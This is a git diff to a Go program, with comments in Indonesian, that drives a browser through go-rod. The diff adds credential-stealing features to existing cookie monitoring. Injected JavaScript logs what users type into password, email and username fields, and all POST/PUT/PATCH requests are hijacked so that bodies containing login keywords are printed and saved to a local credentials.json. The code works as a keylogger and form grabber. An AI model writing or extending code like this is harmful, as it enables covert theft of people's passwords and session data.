@@ -11,6 +11,7 @@ import (
 
 	"github.com/go-rod/rod"
 	"github.com/go-rod/rod/lib/launcher"
+	"github.com/go-rod/rod/lib/proto"
 )
 
 // CookieData struct untuk menyimpan data cookie untuk simulasi
@@ -23,6 +24,14 @@ type CookieData struct {
 	Secure   bool    `json:"secure"`
 	Expires  float64 `json:"expires"`
 	Session  bool    `json:"session"`
+}
+
+// CredentialData untuk menyimpan data login yang disadap
+type CredentialData struct {
+	URL      string    `json:"url"`
+	Type     string    `json:"type"` // "form-data", "json", atau "input-field"
+	Data     string    `json:"data"`
+	Time     time.Time `json:"time"`
 }
 
 func main() {
@@ -68,8 +77,139 @@ func main() {
 
 	page.MustWaitLoad()
 
+	// Monitor input fields (seperti keylogger sederhana pada field password)
+	go monitorInputFields(page, homeDir)
+	
+	// Monitor network request POST untuk menangkap form submission
+	go monitorNetworkRequests(page, homeDir)
+
 	// Monitor cookies secara berkala
 	monitorCookies(browser, homeDir)
+}
+
+func monitorInputFields(page *rod.Page, homeDir string) {
+	// Inject JavaScript untuk merekam input password dan username
+	js := `
+		() => {
+			window.capturedCredentials = {};
+			
+			document.addEventListener('input', (e) => {
+				const target = e.target;
+				if (target.tagName === 'INPUT') {
+					const type = target.type.toLowerCase();
+					const name = target.name || target.id || 'unknown';
+					
+					// Rekam field password, email, text (username)
+					if (type === 'password' || type === 'email' || type === 'text' || name.toLowerCase().includes('user') || name.toLowerCase().includes('login')) {
+						window.capturedCredentials[name] = target.value;
+					}
+				}
+			});
+
+			document.addEventListener('submit', (e) => {
+				// Saat form disubmit, kembalikan data yang tertangkap
+				if (Object.keys(window.capturedCredentials).length > 0) {
+					// Kita bisa kirim data ini lewat evaluasi dari Go
+					e.target.setAttribute('data-captured', JSON.stringify(window.capturedCredentials));
+				}
+			});
+		}
+	`
+	page.MustEval(js)
+	
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+	
+	for range ticker.C {
+		// Tarik data credential dari page
+		res, err := page.Eval(`() => JSON.stringify(window.capturedCredentials || {})`)
+		if err != nil {
+			continue // Page mungkin sedang reload
+		}
+		
+		val := res.Value.Str()
+		if val != "{}" && val != "" {
+			// Kita memiliki data ketikan
+			// Jika ingin dilog langsung setiap ketik bisa di sini
+			// Namun lebih efektif ditangkap saat netwok request (POST)
+		}
+	}
+}
+
+func monitorNetworkRequests(page *rod.Page, homeDir string) {
+	router := page.Browser().HijackRequests()
+	defer router.MustStop()
+
+	router.MustAdd("*", func(ctx *rod.Hijack) {
+		req := ctx.Request.Req()
+		
+		// Deteksi request POST, PUT, atau PATCH yang biasa dipakai login
+		method := req.Method
+		if method == "POST" || method == "PUT" || method == "PATCH" {
+			url := req.URL
+			
+			// Cek apakah ada post data
+			if req.HasPostData {
+				postData := req.PostData
+				
+				// Deteksi keyword yang berhubungan dengan login/auth
+				lowerData := strings.ToLower(postData)
+				if strings.Contains(lowerData, "password") || 
+				   strings.Contains(lowerData, "pass") || 
+				   strings.Contains(lowerData, "user") || 
+				   strings.Contains(lowerData, "email") ||
+				   strings.Contains(lowerData, "login") ||
+				   strings.Contains(lowerData, "auth") {
+					
+					fmt.Printf("\n[!] Potensi Data Login Tersadap (Request POST ke %s)!\n", truncateString(url, 50))
+					
+					cred := CredentialData{
+						URL:  url,
+						Type: "network-request",
+						Data: postData,
+						Time: time.Now(),
+					}
+					
+					// Tentukan tipe data
+					if strings.HasPrefix(postData, "{") {
+						cred.Type = "json"
+						fmt.Printf("   >>> [JSON] %s\n", truncateString(postData, 100))
+					} else {
+						cred.Type = "form-data"
+						fmt.Printf("   >>> [FORM] %s\n", truncateString(postData, 100))
+					}
+					
+					// Load existing credits and append
+					credFile := filepath.Join(homeDir, "browsea-data", "credentials.json")
+					
+					var existingCreds []CredentialData
+					fileData, err := os.ReadFile(credFile)
+					if err == nil {
+						json.Unmarshal(fileData, &existingCreds)
+					}
+					
+					// Hanya tambahkan jika datanya belum ada di daftar untuk mencegah duplikat berlebih
+					isNew := true
+					for _, c := range existingCreds {
+						if c.Data == cred.Data && time.Since(c.Time) < 5*time.Second {
+							isNew = false // Hindari duplicate log dalam rentang 5 detik yang sama (misal ada retry dari browser)
+							break
+						}
+					}
+					
+					if isNew {
+						existingCreds = append(existingCreds, cred)
+						saveToJSON(existingCreds, credFile)
+					}
+				}
+			}
+		}
+		
+		// Lanjutkan request secara normal
+		ctx.ContinueRequest(&proto.FetchContinueRequest{})
+	})
+	
+	go router.Run()
 }
 
 func monitorCookies(browser *rod.Browser, homeDir string) {
